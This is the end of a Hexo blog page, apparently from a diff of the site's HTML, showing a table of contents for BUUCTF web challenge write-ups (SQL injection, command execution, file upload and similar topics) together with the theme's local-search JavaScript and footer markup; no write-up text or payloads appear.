href="http://pig-007.github.io/tags/%E9%99%AAXX%E7%9A%84WebBUU%E5%88%B7%E9%A2%98/">陪XX的WebBUU刷题</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/01/06/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">PHP环境搭建</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/12/29/Web%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/"><span class="paginator-prev__text">[ Untitled ]</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81EasySQL"><span class="toc-text">
+          一、EasySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BASQL%E6%B3%A8%E5%85%A5%E7%99%BB%E5%BD%95"><span class="toc-text">
+          🔺SQL注入登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%9F%A5%E7%9C%8B%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-text">
+          1.查看网页源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-text">
+          2.注入原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun1"><span class="toc-text">
+          三、[极客大挑战 2019]Havefun1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E7%AE%80%E5%8D%95%E6%9F%A5%E8%AF%A2"><span class="toc-text">
+          🔺简单查询</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-text">
+          四、[ACTF2020 新生赛]Include</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BAPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">
+          🔺PHP伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E7%BD%AE%E6%8E%A2%E7%B4%A2"><span class="toc-text">
+          1.前置探索</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8"><span class="toc-text">
+          2.php伪协议利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-base64%E8%A7%A3%E7%A0%81"><span class="toc-text">
+          3.base64解码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81"><span class="toc-text">
+          五、[强网杯 2019]随便注1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BASQL%E6%B3%A8%E5%85%A5-%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF"><span class="toc-text">
+          🔺SQL注入+三种姿势</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90words%E8%A1%A8"><span class="toc-text">
+          解析words表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%901919810931114514%E8%A1%A8"><span class="toc-text">
+          解析1919810931114514表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%A7%A3%E6%B3%95%E4%B8%80-%E6%94%B9%E8%A1%A8"><span class="toc-text">
+          1.解法一(改表)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%94%B9%E5%90%8D"><span class="toc-text">
+          (1)改名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A2%9E%E6%B7%BBid%E5%AD%97%E6%AE%B5"><span class="toc-text">
+          (2)增添id字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BF%AE%E6%94%B9flag%E4%B8%BAdata%E5%AD%97%E6%AE%B5"><span class="toc-text">
+          (3)修改flag为data字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%9A%84payload"><span class="toc-text">
+          总的payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%A7%A3%E6%B3%95%E4%BA%8C-open%E5%92%8Chandler"><span class="toc-text">
+          2.解法二(open和handler)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%A7%A3%E6%B3%95%E4%B8%89-MySQL%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-text">
+          3.解法三(MySQL的预处理)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81-SUCTF-2019-EasySQL"><span class="toc-text">
+          六、[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-text">
+          七、[ACTF2020 新生赛]Exec</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%AF%BB%E6%89%BEflag"><span class="toc-text">
+          🔺命令执行+寻找flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">
+          1.远程命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%90%9C%E7%B4%A2flag%E8%B7%AF%E5%BE%84"><span class="toc-text">
+          2.搜索flag路径</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-text">
+          八、[极客大挑战 2019]Secret File</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E6%8A%93%E5%8C%85-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">
+          🔺抓包+伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E6%9C%9F%E6%8E%A2%E7%B4%A2"><span class="toc-text">
+          1.前期探索</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%8A%93%E5%8C%85"><span class="toc-text">
+          2.抓包</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B9%9D%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-text">
+          九、[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E3%80%81-GXYCTF2019-Ping-Ping-Ping"><span class="toc-text">
+          十、[GXYCTF2019]Ping Ping Ping</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">
+          🔺命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E6%9C%9F%E6%8E%A2%E7%B4%A2-1"><span class="toc-text">
+          1.前期探索</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="toc-text">
+          2.绕过过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A%E6%8B%BC%E6%8E%A5flag"><span class="toc-text">
+          解法一：拼接flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9Ash%E7%BB%93%E5%90%88base64"><span class="toc-text">
+          解法二：sh结合base64</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2linux%E8%87%AA%E5%B8%A6base64%E5%92%8Cbase32"><span class="toc-text">
+          ▲linux自带base64和base32</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-base64%E5%8A%A0%E5%AF%86"><span class="toc-text">
+          (1)base64加密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-base64%E8%A7%A3%E5%AF%86"><span class="toc-text">
+          (2)base64解密</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%89%EF%BC%9Alinux%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-text">
+          解法三：linux内联执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%96%B2%E5%85%B6%E4%BB%96"><span class="toc-text">
+          ▲其他</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-text">
+          十一、[极客大挑战 2019]Knife</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-text">
+          🔺一句话木马</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="toc-text">
+          十二、[极客大挑战 2019]Http</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E4%BD%BF%E7%94%A8BurpSuit%E6%94%B9%E5%8C%85%E5%A4%B4"><span class="toc-text">
+          🔺使用BurpSuit改包头</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E6%9C%9F%E6%8E%A2%E7%B4%A2-2"><span class="toc-text">
+          1.前期探索</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-BurpSuite%E4%BD%BF%E7%94%A8%E6%94%B9%E5%8C%85"><span class="toc-text">
+          2.BurpSuite使用改包</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%AE%E6%94%B9Referer"><span class="toc-text">
+          (1)修改Referer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BF%AE%E6%94%B9User-Agent"><span class="toc-text">
+          (2)修改User-Agent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BF%AE%E6%94%B9X-Forwarded-For"><span class="toc-text">
+          (3)修改X-Forwarded-For</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%B8%89%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-text">
+          十三、[极客大挑战 2019]Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E3%80%81%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-text">
+          🔺文件上传漏洞、一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E6%9C%9F%E6%8E%A2%E7%B4%A2-3"><span class="toc-text">
+          1.前期探索</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4-1"><span class="toc-text">
+          2.绕过过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%AE%E6%94%B9Content-Type"><span class="toc-text">
+          (1)修改Content-Type</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BF%AE%E6%94%B9%E5%90%8E%E7%BC%80%E5%90%8D"><span class="toc-text">
+          (2)修改后缀名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BF%AE%E6%94%B9php%E6%A0%BC%E5%BC%8F"><span class="toc-text">
+          (3)修改php格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%B0%9D%E8%AF%95%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E5%A4%B4%E9%83%A8"><span class="toc-text">
+          (4)尝试修改文件头部</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%9F%A5%E6%89%BE%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-text">
+          3.查找上传文件路径</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="toc-text">
+          十四、[ACTF2020 新生赛]Upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%BA%94%E3%80%81-RoarCTF-2019-Easy-Calc"><span class="toc-text">
+          十五、[RoarCTF 2019]Easy Calc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%81php%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E3%80%81HTTP%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB"><span class="toc-text">
+          🔺命令执行、php字符串解析、HTTP走私攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E6%9C%9F%E6%8E%A2%E7%B4%A2-4"><span class="toc-text">
+          1.前期探索</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="toc-text">
+          2.解决方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A%E5%88%A9%E7%94%A8php%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87WAF"><span class="toc-text">
+          解法一：利用php字符串解析特性绕过WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%BB%95%E8%BF%87WAF"><span class="toc-text">
+          (1)绕过WAF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4-2"><span class="toc-text">
+          (2)绕过过滤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%88%A9%E7%94%A8HTTP%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB"><span class="toc-text">
+          解法二：利用HTTP走私攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8CL-CL"><span class="toc-text">
+          (1)利用CL-CL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8CL-TE"><span class="toc-text">
+          (2)利用CL-TE</span></a></li></ol></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">108</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">49</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">50</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', 'Please enter characters');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>
